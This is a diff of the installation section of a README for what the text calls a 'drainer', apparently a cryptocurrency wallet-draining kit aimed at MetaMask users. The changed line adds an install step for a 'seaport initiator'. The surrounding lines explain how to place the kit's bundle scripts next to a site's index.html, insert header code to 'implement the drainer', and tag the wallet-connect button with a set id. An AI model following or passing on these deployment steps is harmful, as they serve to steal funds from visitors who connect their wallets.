@@ -3,7 +3,7 @@
 ---
 
 ## `Installation Guide`
-Put the `chain-bundle` & `chain-common` script with your index.html & css or etc folders.
+Install 'seaport initiator, then put the `chain-bundle` & `chain-common` script with your index.html & css or etc folders.
 
 Adding the drainer is as simple as adding header code below <header> on your site to implement the drainer.
 As-well as this you will need to add a id name to your button of id="metamaskbutton" 6 buttons are supported including:
